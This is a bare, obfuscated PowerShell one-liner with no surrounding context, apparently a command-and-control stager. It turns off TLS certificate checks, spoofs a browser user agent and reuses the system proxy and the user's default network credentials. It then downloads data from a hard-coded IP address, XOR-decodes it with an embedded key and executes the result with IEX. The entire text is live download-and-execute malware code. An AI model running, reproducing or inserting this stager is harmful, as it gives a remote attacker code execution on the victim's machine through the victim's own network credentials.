$WC=NeW-OBJeCT SYstEm.NeT.WEbClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HEADers.ADD('User-Agent',$u);$wc.PRoxy = [SYSTem.NEt.WEbREquesT]::DefauLtWEBPROXY;$wc.PrOXY.CREDenTIALs = [SySTeM.NeT.CREDeNTIAlCache]::DEFaulTNEtwOrKCREDeNTIals;$K='`SJvf1r]LZpi#z%xGd;2u>8Ht-NjFw,_';$I=0;[CHAR[]]$B=([char[]]($wc.DOWnLOaDStrInG("https://104.131.182.177:443/index.asp")))|%{$_-BXor$k[$i++%$K.LEngtH]};IEX ($B-joiN'')